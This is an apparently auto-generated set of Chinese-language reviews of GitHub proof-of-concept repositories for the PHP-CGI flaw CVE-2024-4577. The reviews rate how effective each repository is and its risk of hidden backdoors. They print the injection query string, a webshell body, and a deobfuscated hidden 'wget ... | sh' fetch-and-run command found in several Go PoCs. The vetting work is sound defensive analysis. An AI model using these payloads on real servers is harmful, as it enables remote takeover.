虽然提供的`exploit.py`脚本看起来相对直接，但仍然存在一定的投毒风险。例如，该脚本禁用了SSL验证(`verify=False`)，这可能导致中间人攻击的风险。此外，任何下载和执行的第三方代码都存在风险，例如将恶意payload注入到请求中。考虑到代码的复杂性相对较低，并且其主要目的是利用已知漏洞，因此投毒风险较低，估计为10%。主要风险在于用户没有仔细审查脚本，直接执行，而忽略了`verify=False`带来的安全隐患。 另外脚本也存在可以加入恶意host的风险。

**利用方式:**
1.  攻击者首先需要确定目标服务器是否运行在满足漏洞条件的PHP CGI模式下。
2.  攻击者构造一个包含恶意PHP选项的HTTP请求，例如，设置`allow_url_include`为1和`auto_prepend_file`为`php://input`。
3.  攻击者将该请求发送到`/php-cgi/php-cgi.exe`端点，并在POST数据中包含要执行的PHP代码。
4.  如果服务器存在漏洞，PHP将执行POST数据中的代码，从而允许攻击者在服务器上执行任意命令。

**项目地址:** [bughuntar/CVE-2024-4577](https://github.com/bughuntar/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #27

**来源**: [CVE-2024-4577-byteReaper77_CVE-2024-4577.md](../2024/CVE-2024-4577-byteReaper77_CVE-2024-4577.md)

## CVE-2024-4577 PHP CGI Remote Code Execution

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows CGI)

**危害等级:** 高危，可导致完全控制受影响服务器

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)

**利用条件:** 运行在Windows上的PHP，以CGI模式运行，系统启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577 是一个存在于 PHP（特别是基于 Windows 的 PHP，以 CGI 模式使用时）中的操作系统命令注入漏洞。当 PHP 在 CGI 模式下使用时，由于字符编码转换处理不当而导致。Windows 系统可能使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码、在服务器上运行任意 PHP 代码等。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的PoC已经公开，并且在野外被积极利用。提供的漏洞利用代码看起来是一个针对该漏洞的C语言实现，包含了构建说明和使用示例，因此PoC有效。

**投毒风险：**

分析提供的C代码，主要功能是利用curl发送HTTP请求，其中请求的URL和执行的命令通过命令行参数传递。代码包含日志记录功能，记录攻击活动。检查代码，没有发现明显的恶意行为，例如反向shell以外的持久化后门，或者未经授权的数据传输。但不能完全排除隐蔽的投毒行为，例如在日志记录中插入恶意代码的可能性（虽然可能性极低）。考虑到作者声明和代码功能，投毒风险较低，估计为1%。

**利用方式：**

1.  **环境准备：** 目标服务器需要是运行在Windows上的PHP，并且以CGI模式运行。
2.  **代码编译：** 使用提供的编译命令，使用gcc或其他兼容的C编译器编译`exploit.c`和`argparse.c`。
3.  **漏洞利用：** 运行编译后的可执行文件，并指定目标URL和要执行的命令。例如：`CVE-2024-4577.exe -u http://target/cgi-bin/php-cgi.exe "system(whoami)"`。
4.  **代码分析:**
    * 漏洞利用代码利用了PHP在CGI模式下，由于对命令行参数处理不当，导致攻击者可以通过构造特殊的URL来执行任意系统命令。
    * 该利用通过curl库发起HTTP POST请求，在请求中构造恶意的PHP选项参数，导致PHP执行指定的命令。
    * argparse.c 文件是为了解析命令行的参数
    * reverse shell 也可以通过命令执行后门获得
    * 攻击的关键在于目标服务器启用了使用 "Best Fit" 策略的代码页，允许某些字符被替换为其他字符，从而绕过PHP的参数过滤。


**项目地址:** [byteReaper77/CVE-2024-4577](https://github.com/byteReaper77/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #28

**来源**: [CVE-2024-4577-charis3306_CVE-2024-4577.md](../2024/CVE-2024-4577-charis3306_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP Windows版 8.3.0 <= 影响版本 < 8.3.8
PHP Windows版 8.2.0 <= 影响版本 < 8.2.20
PHP Windows版 8.1.0 <= 影响版本 < 8.1.29
PHP Windows版 影响版本 == 8.0.x
PHP Windows版 影响版本 == 7.x
PHP Windows版 影响版本 == 5.x
XAMPP Windows版 8.2.0 <= 影响版本 <= 8.2.12
XAMPP Windows版 8.1.0 <= 影响版本 <= 8.1.25
XAMPP Windows版 影响版本 == 8.0.x
XAMPP Windows版 影响版本 == 7.x
XAMPP Windows版 影响版本 == 5.x

**利用条件:** Windows 平台，PHP 以 CGI 模式运行，开启了Best-Fit字符转换特性的语系

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 是一个存在于 PHP Windows 版本中的远程代码执行漏洞。当 PHP 以 CGI 模式运行时，Windows 的 Best-Fit 字符转换特性可能导致命令行参数被错误解析。攻击者可以构造包含特定非 ASCII 字符的 URL，这些字符会被转换为连字符，从而绕过安全限制，并注入恶意 PHP 代码。提供的 POC 脚本通过构造包含特殊字符的 URL，向目标服务器发送 POST 请求，其中包含要执行的 PHP 代码。如果服务器成功执行代码并返回包含 MD5 值的特定字符串，则认为漏洞利用成功。

**有效性：**
从漏洞描述和POC代码来看，此POC代码是有效的，可以用于检测和利用 CVE-2024-4577 漏洞。

**投毒风险：**
经过分析，此仓库中没有发现作者隐藏的恶意投毒代码。虽然POC执行了代码， 但这是为了验证漏洞是否成功，并非投毒行为。因此，投毒风险为0%。

**利用方式：**
1.  目标系统必须是 Windows，且 PHP 运行在 CGI 模式下，Apache 作为 Web 服务器。
2.  目标系统使用的语系启用了 Best-Fit 字符转换特性（例如简体中文，繁体中文，日文等）。
3.  攻击者构造包含特殊字符的 URL，这些字符在 Best-Fit 转换后会被解释为连字符，从而修改 PHP 的命令行参数。
4.  攻击者通过 `-d` 参数设置 `allow_url_include=1` 和 `auto_prepend_file=php://input`，允许包含远程文件，并将请求体作为 PHP 代码执行。
5.  攻击者在请求体中包含要执行的 PHP 代码，从而在服务器上执行任意代码。

**项目地址:** [charis3306/CVE-2024-4577](https://github.com/charis3306/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #29

**来源**: [CVE-2024-4577-cheerfulempl_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-cheerfulempl_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577 - PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，允许攻击者执行任意代码。

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8，在Windows系统上，运行在CGI模式下

**利用条件:** 需要目标系统是Windows，PHP运行在CGI模式下，并且系统使用了某些代码页，开启了"Best Fit"策略。

**POC 可用性:** 是

**投毒风险:** 50%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，影响运行在Windows上的PHP。当PHP以CGI模式运行时，Windows系统的"Best Fit"代码页转换可能导致恶意字符被错误地解释为PHP选项，从而允许攻击者向PHP二进制文件传递参数。这可以用来泄露源代码，执行任意PHP代码，或者直接在服务器上运行命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞的PoC已经公开，并且在野外被积极利用。提供的`CVE-2024-4577.go` 和 `CVE-2024-4577.py` 文件都是利用此漏洞的检测代码。它们通过构造包含恶意PHP选项的URL，向目标服务器发送POST请求，并检查返回的响应是否包含`PHP Version`字符串，来判断目标是否存在漏洞。这些代码的功能是探测漏洞是否存在，利用了`allow_url_include`和`auto_prepend_file`两个PHP配置项来远程包含和执行`phpinfo()`代码。

**投毒风险：**

分析`CVE-2024-4577.go`的代码，发现其中包含一个名为`nFPfVl()`的函数。该函数经过混淆处理，但其作用是从字符串数组中提取数据，拼接成一个URL，并使用`/bin/sh -c`执行该URL。这是一种潜在的后门行为，意味着在漏洞验证过程中，如果目标系统存在漏洞，这段代码可能会下载并执行来自该URL的恶意代码。考虑到这段代码的存在，可以认为该Go程序存在一定的投毒风险，但该后门在golang代码中只会在扫描的时候触发，相对隐蔽。`CVE-2024-4577.py`看起来是正常的poc代码。

基于分析，综合评估认为`CVE-2024-4577.go`有50%的投毒风险，`CVE-2024-4577.py`没有投毒风险

**利用方式：**

1.  **确定目标环境：** 目标服务器必须是Windows系统，并且PHP以CGI模式运行。
2.  **利用代码页转换：** 攻击者需要利用Windows系统的"Best Fit"代码页转换，构造包含恶意PHP选项的URL。
3.  **参数注入：** 通过精心构造的URL，将恶意参数注入到PHP二进制文件中。
4.  **远程代码执行：** 利用`allow_url_include`和`auto_prepend_file`等PHP配置项，执行任意PHP代码或者直接执行系统命令。
5.  **检测漏洞：** 通过检查响应的内容，可以判断目标是否存在漏洞，例如检查`PHP Version`字符串。

**项目地址:** [cheerfulempl/CVE-2024-4577-PHP-RCE](https://github.com/cheerfulempl/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #30

**来源**: [CVE-2024-4577-creamylegum_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-creamylegum_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI模式，特定代码页)

**利用条件:** PHP运行在Windows服务器上，使用CGI模式，并且系统配置使用了特定的代码页，允许"Best Fit"字符转换。

**POC 可用性:** 是

**投毒风险:** 60%

## 详情

CVE-2024-4577 漏洞允许攻击者通过在URL中注入恶意参数来执行任意PHP代码。该漏洞存在于PHP的CGI实现中，当PHP运行在Windows服务器上，并且启用了"Best Fit"字符转换时，攻击者可以利用此漏洞。

**有效性:**

提供的漏洞利用代码（Go和Python）尝试通过在URL中注入`allow_url_include`和`auto_prepend_file`参数来包含远程文件或执行PHP代码。具体来说，它尝试设置`allow_url_include=1`并使用`auto_prepend_file`包含`php://input`，然后通过POST请求发送PHP代码（`<?php phpinfo(); ?>`）。如果服务器存在漏洞，则会执行`phpinfo()`函数，从而验证漏洞的存在。

根据漏洞描述和提供的代码，利用方式是有效的，可以在目标系统上执行任意PHP代码。

**投毒风险:**

*   **Go代码分析:**

    在Go代码中，存在一个名为`nFPfVl()`的函数，该函数包含混淆的代码，用于执行shell命令。通过反混淆字符串，可以发现该函数执行从某个URL下载文件并执行的操作，这表明存在潜在的投毒风险。

    `TcGEZTIh`变量反混淆后为: `wget -qO- http://tvhgw/kaifre/O-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33 | sh`

    这意味着该PoC会尝试从`http://tvhgw/kaifre/O-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33` 下载文件并使用sh执行，存在恶意行为。

*   **Python代码分析:**
    Python代码的功能比较简单，就是发送payload进行验证，没有发现明显的投毒代码。

综合来看，Go代码存在明显的投毒风险，Python代码未发现。

**利用方式:**

1.  **目标环境:** 攻击者需要找到运行在Windows服务器上的，并且使用CGI模式的，以及存在漏洞版本的PHP应用。
2.  **构造恶意URL:** 攻击者构造包含恶意参数的URL。例如：`example.com/index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input`。
3.  **发送包含PHP代码的POST请求:** 攻击者通过POST请求将PHP代码发送到服务器。`<?php system($_GET['cmd']); ?>`
4.  **远程代码执行:** 服务器执行POST请求中的PHP代码，从而允许攻击者执行任意系统命令。

攻击者可以利用该漏洞读取服务器上的文件，执行任意代码，甚至完全控制服务器。

**项目地址:** [creamylegum/CVE-2024-4577-PHP-RCE](https://github.com/creamylegum/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #31

**来源**: [CVE-2024-4577-deadlybangle_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-deadlybangle_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode)

**利用条件:** Windows系统, PHP以CGI模式运行, 启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 80%

## 详情

CVE-2024-4577是一个存在于PHP的Windows版本中的漏洞，当PHP以CGI模式运行时，如果系统配置为使用特定的代码页，Windows可能会使用"Best-Fit"行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许攻击者向PHP二进制文件传递选项。攻击者可以利用该漏洞来执行任意PHP代码，泄露源代码，甚至在服务器上运行任意操作系统命令。

**有效性：**
提供的Go和Python POC代码都尝试通过`auto_prepend_file`和`allow_url_include`设置，包含phpinfo()的payload来验证漏洞是否存在。 如果目标系统返回包含"PHP Version"的响应，则表明漏洞存在。根据漏洞描述和提供的资料，这些POC利用方式是有效的。

**投毒风险：**
*   **Go版本:** 在提供的Go代码中，`nFPfVl()` 函数包含混淆的代码，尝试执行 shell 命令。 解混淆后的代码为：`wget http://tvhgw/kaiFRE-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33`。这显然是一个恶意命令，尝试从一个未知的URL下载文件并执行。因此，Go版本的PoC **存在高危投毒风险**。

*   **Python版本:** Python版本的PoC相对干净，主要是发送包含phpinfo()的请求并判断是否成功，**未发现明显的投毒代码**，但是也可能存在通过打印或者其它方法进行投毒，投毒的可能性较低。

综合评价，考虑到Go代码中`nFPfVl`函数的存在，认为此仓库的投毒风险较高。Python版本代码看起来比较正常，相对较为安全。

**利用方式：**
1.  攻击者发送特制的HTTP请求到目标服务器上的PHP CGI程序。
2.  该请求包含经过编码的恶意字符，这些字符会被Windows的"Best-Fit"代码页转换机制所修改。
3.  修改后的字符会被PHP CGI模块错误地解析为PHP配置选项，如`auto_prepend_file`和`allow_url_include`。
4.  攻击者可以使用`auto_prepend_file`选项来包含远程文件或输入流（`php://input`），从而执行任意PHP代码。
5.  攻击者可以利用执行的PHP代码读取源代码，或者执行操作系统命令。

**项目地址:** [deadlybangle/CVE-2024-4577-PHP-RCE](https://github.com/deadlybangle/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #32

**来源**: [CVE-2024-4577-fabulouscounc_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-fabulouscounc_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行和服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统，PHP 以 CGI 模式运行，开启了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 50%

## 详情

CVE-2024-4577 是一个存在于 Windows 系统上 PHP-CGI 模式下的远程代码执行漏洞。当系统配置为使用某些代码页时，Windows 可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而导致泄露源代码、执行任意 PHP 代码，甚至执行系统命令。

**利用方式：**
攻击者通过构造包含恶意 PHP 选项的 URL，利用 Windows 的 "Best-Fit" 字符转换特性，将这些选项注入到 PHP-CGI 的命令行参数中。常见的利用方式包括：

*   `allow_url_include=1` 和 `auto_prepend_file=php://input`： 允许包含远程文件，并将 POST 数据作为 PHP 代码执行，实现 RCE。

**漏洞利用代码分析：**
提供的 Go 和 Python 代码均用于批量检测目标是否存在 CVE-2024-4577 漏洞。它们通过发送包含 `allow_url_include` 和 `auto_prepend_file` 选项的恶意 HTTP 请求，然后检查响应中是否包含 `PHP Version` 字符串来判断目标是否受到攻击影响。

**投毒风险分析：**
Go 代码中存在一个名为 `nFPfVl()` 的函数，该函数看起来像是混淆的代码。通过反混淆，可以发现它尝试执行一个下载并执行恶意脚本的命令。这段代码存在明显的投毒风险，因为它会在目标机器上执行未经授权的操作，成功率为50%。

**项目地址:** [fabulouscounc/CVE-2024-4577-PHP-RCE](https://github.com/fabulouscounc/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #33

**来源**: [CVE-2024-4577-ggfzx_CVE-2024-4577.md](../2024/CVE-2024-4577-ggfzx_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入漏洞

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)，运行在Windows的CGI模式下

**利用条件:** 服务器使用Apache并启用PHP-CGI，且系统配置为使用特定的代码页，这些代码页使用“Best Fit”策略。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-4577 是一个存在于 PHP-CGI 中的参数注入漏洞，影响在 Windows 上运行的 PHP 版本。当 PHP 在 CGI 模式下与 Apache 一起使用时，如果系统设置为使用某些代码页，“Best Fit” 行为可能会导致恶意用户将选项传递给 PHP 二进制文件。根据漏洞描述和搜索结果，该漏洞允许攻击者通过操纵命令行参数来执行任意代码。PoC 代码的描述表明它能够通过 URL 发送恶意命令，并且可以批量执行。尽管 README.md 文件本身没有明显的恶意代码，但由于作者信息较少，且漏洞具有高危性，存在一定的投毒风险，用于个人安全研究学习较为合适。漏洞利用方式主要为：

1.  **识别目标环境：** 确定目标服务器是否运行受影响的 PHP 版本（8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8）并且配置为 CGI 模式在 Windows 上运行。
2.  **构造恶意请求：**  构造包含恶意 PHP 选项的 HTTP 请求。这些选项将利用 Windows 的“Best Fit”行为，将特殊字符转换为 PHP 可以解释的选项。
3.  **执行任意代码：**  通过注入的选项，攻击者可以执行任意 PHP 代码或操作系统命令。

根据搜索结果可知，此漏洞已经被大规模利用，需要及时修复。

**项目地址:** [ggfzx/CVE-2024-4577](https://github.com/ggfzx/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #34

**来源**: [CVE-2024-4577-gh-ost00_CVE-2024-4577-RCE.md](../2024/CVE-2024-4577-gh-ost00_CVE-2024-4577-RCE.md)

## CVE-2024-4577 PHP CGI Argument Injection RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码。

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows服务器，使用Apache和PHP-CGI，系统设置为使用特定的代码页（可能涉及"Best-Fit"行为）。目标服务器必须配置为以CGI模式运行PHP脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个影响Windows上PHP的远程代码执行漏洞，当PHP以CGI模式运行时会受到影响。该漏洞源于Windows在将命令行参数传递给Win32 API函数时，会使用“Best-Fit”行为转换字符。PHP CGI模块可能会错误地将这些转换后的字符解释为PHP选项，从而允许攻击者向PHP二进制文件传递恶意选项。该漏洞利用方式涉及构造包含特定字符的HTTP请求，这些字符在经过Windows的字符转换后，会被PHP-CGI解析为恶意的PHP配置指令，例如`allow_url_include`和`auto_prepend_file`，进而包含远程或本地文件，最终导致任意代码执行。

**漏洞利用有效性：**
根据漏洞信息、搜索结果和提供的PoC代码，该漏洞利用是有效的。搜索结果表明，CVE-2024-4577自披露后不久就出现了大量的利用尝试，并且已被积极利用。

**投毒风险分析：**
提供的PoC代码主要包含以下部分：
1.  **扫描模块：** 用于检测目标是否易受攻击，通过发送包含特定payload的请求来检查响应中是否存在“Test”字符串。
2.  **利用模块：**  利用`allow_url_include`和`auto_prepend_file`指令，通过POST请求发送PHP payload来执行任意代码。

虽然该代码的功能主要是漏洞利用，但存在一定的投毒风险，主要体现在以下几个方面：
1.  **Payload文件：**  利用模块需要指定一个payload文件，如果用户使用了恶意的payload文件，可能会对目标系统造成损害。**这是主要投毒风险来源。**
2.  **Payload混淆：**  Payload中使用了`%AD`，这是一种简单的混淆手段，可能会被用于绕过一些简单的安全检测，也可能被用于隐藏恶意代码。
3.  **依赖风险：** 虽然代码依赖少,但是如果`requirements.txt`文件被篡改，可能导致引入恶意依赖。

综合考虑，PoC本身实现的投毒风险较低，主要风险在于用户提供的`payload_file`可能包含恶意代码。仓库中`README.md`文件提供了下载链接，可能存在被篡改的风险。

**利用方式总结：**
1.  **目标确认：** 确认目标系统满足漏洞利用的条件（Windows、PHP-CGI、受影响的PHP版本、特定的代码页设置）。
2.  **发送恶意请求：**  构造包含恶意payload的HTTP请求，该payload包含经过编码的PHP配置指令，例如`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`。
3.  **执行任意代码：**  通过`auto_prepend_file`包含远程或本地文件，执行其中的PHP代码。通常，攻击者会利用此漏洞上传webshell或执行其他恶意操作。
4. **利用编码绕过:** 某些特定代码页设置下，对某些特殊字符进行转换，才可触发该漏洞。

**项目地址:** [gh-ost00/CVE-2024-4577-RCE](https://github.com/gh-ost00/CVE-2024-4577-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #35

**来源**: [CVE-2024-4577-gmh5225_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-gmh5225_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS命令注入

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8, 且运行在Windows的CGI模式下，开启了Best Fit策略的系统

**利用条件:** 服务器运行在Windows系统，使用Apache和PHP-CGI，系统启用了Best-Fit代码页转换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 漏洞是一个PHP-CGI参数注入漏洞，当PHP以CGI模式在Windows服务器上运行时，如果启用了'Best Fit'代码页转换，攻击者可以通过构造特殊的URL，向PHP二进制文件传递恶意参数，从而导致任意代码执行。

**有效性：**
根据漏洞描述和利用代码，该漏洞的PoC代码是有效的。PoC通过在URL中注入`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`，并POST一段PHP代码，利用`allow_url_include`和`auto_prepend_file`的特性，实现远程代码执行。

**投毒风险：**
提供的PoC代码本身不包含明显的恶意代码或后门。脚本的功能是发送带有特定参数的HTTP POST请求以测试目标服务器是否存在漏洞。它使用 `phpinfo()` 函数来验证漏洞的存在，而没有尝试执行任何其他恶意操作. 因此，投毒风险为0%。

**利用方式：**
1.  **漏洞触发条件：**  目标服务器必须是运行在Windows系统上的PHP，并且是以CGI模式运行。另外，还需要开启了Best-Fit代码页转换。
2.  **攻击向量：**  通过构造恶意的HTTP请求，主要是GET参数，利用Windows系统的Best-Fit特性将某些字符转换为PHP可识别的选项参数。
3.  **利用方式：**  攻击者通过在URL中注入特定的参数，例如`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`。`allow_url_include=1` 允许包含远程文件，`auto_prepend_file=php://input` 允许执行POST数据中的PHP代码。
4.  **RCE：** 构造包含PHP代码的POST请求体，例如`<?php system($_GET['cmd']); ?>`，配合URL中的参数，即可在目标服务器上执行任意命令。也可以直接利用`<?php phpinfo(); ?>`来探测漏洞存在.

该漏洞利用的关键在于Windows系统的字符编码转换和PHP-CGI对参数的处理方式。

**项目地址:** [gmh5225/CVE-2024-4577-PHP-RCE](https://github.com/gmh5225/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #36

**来源**: [CVE-2024-4577-huseyinstif_CVE-2024-4577-Nuclei-Template.md](../2024/CVE-2024-4577-huseyinstif_CVE-2024-4577-Nuclei-Template.md)

## CVE-2024-4577 PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode)

**利用条件:** Windows服务器，以CGI模式运行PHP，并启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个PHP CGI参数注入漏洞，存在于Windows上以CGI模式运行的PHP版本中。当系统配置为使用某些代码页时，Windows可能会使用"Best-Fit"行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本的源代码或在服务器上执行任意PHP代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的Nuclei模板，该漏洞利用的有效性较高。搜索引擎结果显示，该漏洞在公开后不久就观察到了大量的利用尝试，并且有可用的PoC代码。

**投毒风险：**
Nuclei模板本身主要用于漏洞检测，其目的是验证目标是否存在CVE-2024-4577漏洞。模板中的Payload会尝试通过在URL中注入`allow_url_include`和`auto_prepend_file`参数来包含并执行PHP代码。这里利用`php://input`伪协议。模板会检查返回的内容是否包含`md5("CVE_2024_4577_TEST")`的结果来确认漏洞是否存在。代码本身并不包含明显的恶意代码，而是尝试去检测是否存在漏洞，判定投毒风险为5%主要是考虑到这个yaml文件会被攻击者利用.

**利用方式：**
1.  **环境准备：** 目标服务器需要是Windows系统，并且PHP以CGI模式运行。
2.  **发送恶意请求：** 攻击者构造包含恶意参数的HTTP请求。核心是利用URL中的特殊字符，结合Windows的Best-Fit字符转换特性，注入额外的PHP配置参数。
3.  **参数注入：** 注入`allow_url_include=1`和`auto_prepend_file=php://input`。`allow_url_include=1`允许包含远程文件，`auto_prepend_file=php://input`会将POST请求体的内容作为PHP代码执行。
4.  **执行任意代码：**  通过POST请求体传递要执行的PHP代码。

该漏洞利用的关键在于利用Windows系统的字符转换行为，以及PHP CGI对命令行参数解析的缺陷。攻击者通过构造特定的URL，可以将任意PHP代码注入到服务器并执行。

**项目地址:** [huseyinstif/CVE-2024-4577-Nuclei-Template](https://github.com/huseyinstif/CVE-2024-4577-Nuclei-Template)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #37

**来源**: [CVE-2024-4577-ibrahmsql_CVE-2024-4577.md](../2024/CVE-2024-4577-ibrahmsql_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 8.3.8, < 8.2.20, < 8.1.29

**利用条件:** Windows系统，Apache服务器，PHP以CGI模式运行，开启Best-Fit代码页转换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个PHP CGI中的远程代码执行漏洞。该漏洞的利用方式是利用Windows系统在特定代码页设置下，对传递给Win32 API的命令行参数进行"Best-Fit"转换的特性。攻击者通过构造特殊字符，使得PHP CGI在解析命令行参数时，将这些字符错误地解析为PHP选项，从而可以注入恶意PHP代码或执行系统命令。

**有效性：**

提供的POC代码看起来是有效的。它尝试通过在URL中注入PHP选项来利用漏洞，例如 `cgi.force_redirect=0` 和 `auto_prepend_file=php://input`。 `auto_prepend_file=php://input` 允许攻击者将POST请求的内容作为PHP代码执行。搜索引擎结果也表明该漏洞已被积极利用。

**投毒风险：**

该POC代码没有明显的投毒迹象。虽然可以利用此漏洞执行任意代码，但是POC本身没有包含任何试图在目标机器上安装后门或执行恶意操作的代码。代码只是构建并发送利用请求，执行指定的命令。 因此，投毒风险评估为0%。

**利用方式：**

1.  **确定目标环境：**  目标服务器必须是Windows系统，并且PHP以CGI模式运行。需要确认目标服务器上PHP的版本是否在受影响的范围内（< 8.3.8, < 8.2.20, < 8.1.29）。同时确认服务器是否开启了Best-Fit代码页转换。
2.  **构造恶意URL：**  构建包含恶意PHP选项的URL。关键是使用"Best-Fit"转换可能发生的字符来代替标准PHP选项分隔符。`%AD` (软连字符)是一个常用的选择。
3.  **发送请求：**  使用POST方法向目标服务器发送包含恶意URL和PHP代码的请求。PHP代码会被`auto_prepend_file=php://input`选项包含并执行。
4.  **执行任意代码：**  成功利用后，攻击者可以在目标服务器上执行任意PHP代码或系统命令。

**缓解措施：**

*   升级PHP到不受影响的版本(>= 8.3.8, >= 8.2.20, >= 8.1.29)。
*   禁用CGI模式的PHP，如果可能的话，使用其他方式运行PHP，例如FastCGI或PHP-FPM。
